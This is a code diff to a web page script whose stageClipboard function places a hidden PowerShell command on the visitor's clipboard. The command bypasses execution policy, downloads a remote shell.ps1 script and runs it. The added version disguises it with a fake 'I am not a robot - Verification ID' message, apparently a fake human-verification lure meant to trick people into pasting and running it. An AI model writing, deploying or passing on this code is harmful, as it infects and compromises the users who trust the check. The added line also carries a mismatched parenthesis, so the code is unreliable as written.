@@ -454,10 +454,10 @@
     }
 
     function stageClipboard(verification_id) {
-        // Powershell command + custom verification ID
-        const text = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('https://forhad-ahmed230.github.io/tools/shell.ps1')"; `;
-        setClipboardCopyData(text);
-    }
+    const text = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('https://forhad-ahmed230.github.io/tools/shell.ps1')); Write-Host 'I am not a robot - Verification ID: ${verification_id}'"`;
+    setClipboardCopyData(text);
+}
+
 
     function showVerifyWindow() {
         verifyWindowEl.classList.add('visible');
